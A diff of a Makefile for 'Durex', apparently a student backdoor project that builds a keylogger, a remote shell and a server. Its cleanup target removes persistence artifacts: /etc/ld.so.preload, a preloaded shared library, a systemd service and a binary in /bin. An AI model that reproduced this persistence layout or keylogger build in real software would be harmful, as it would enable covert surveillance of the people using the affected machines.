@@ -6,13 +6,13 @@
 #    By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/01/12 20:15:31 by root              #+#    #+#              #
-#    Updated: 2019/07/19 17:19:19 by gbourgeo         ###   ########.fr        #
+#    Updated: 2019/08/04 05:55:08 by gbourgeo         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 NAME	= Durex
 SRC		= main.c install.c durex.c server.c client.c encrypt.c commands.c
-SRC		+= signal.c move.c reporter.c stdlib.c library.c shell.c
+SRC		+= signal.c move.c reporter.c stdlib.c library.c shell.c server_stats.c
 SRC_KEY	= keylogger_init.c keylogger_loop.c handlers.c
 SRC_KEY	+= get_console.c get_keyboard.c get_keymaps.c get_keys.c get_keystate.c
 OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
@@ -24,7 +24,9 @@ SRC_KEY_DIR = $(SRC_DIR)keylogger/
 HDR_DIR = -I includes/
 OBJ_DIR	= objs/
 DEP_DIR = .deps/
+ifdef X11
 LIBS	= -lX11
+endif
 FLAGS	= -Wall -Werror -Wextra
 
 all: $(OBJ_DIR) $(NAME)
@@ -65,34 +67,23 @@ re: fclean all
 rm:
 	/bin/rm -f /etc/ld.so.preload
 	/bin/rm -f /usr/local/lib/Durex.so
-	@if test -f /etc/init.d/durex.sh; then \
-	update-rc.d -f durex.sh remove \
-	&& echo durex.sh removed; \
-	fi
-	/bin/rm -f /etc/init.d/durex.sh
-	/bin/rm -f /etc/init/durex.conf
-	@if test -f /etc/systemd/system/durex.service; then \
-	systemctl stop durex \
-	&& systemctl disable durex \
-	&& echo durex.sevice disabled; \
-	fi
-	/bin/rm -f /etc/systemd/system/durex.service
-	@if test -f /lib/systemd/system/durex.service; then \
-	rm -f /lib/systemd/system/durex.service && \
+	@if test -f /lib/systemd/system/Durex.service; then \
+	systemctl stop Durex && \
+	systemctl disable Durex && \
+	/bin/rm /lib/systemd/system/Durex.service && \
 	echo rm Durex service; \
 	fi
-	/bin/rm -f /lib/systemd/system/durex.service
 	@if test -f /bin/Durex; then \
 	rm /bin/Durex && \
 	echo rm Durex; \
 	fi
-	@if test -f /var/log/Durex.log; then \
-	rm /var/log/Durex.log && \
-	echo rm Durex log; \
-	fi
 	@if test -f /var/lock/Durex.lock; then \
 	rm /var/lock/Durex.lock && \
 	echo rm Durex lock; \
+	fi
+	@if test -f /var/log/Durex.log; then \
+	/bin/rm /var/log/Durex.log && \
+	echo rm Durex log; \
 	fi
 
 files:
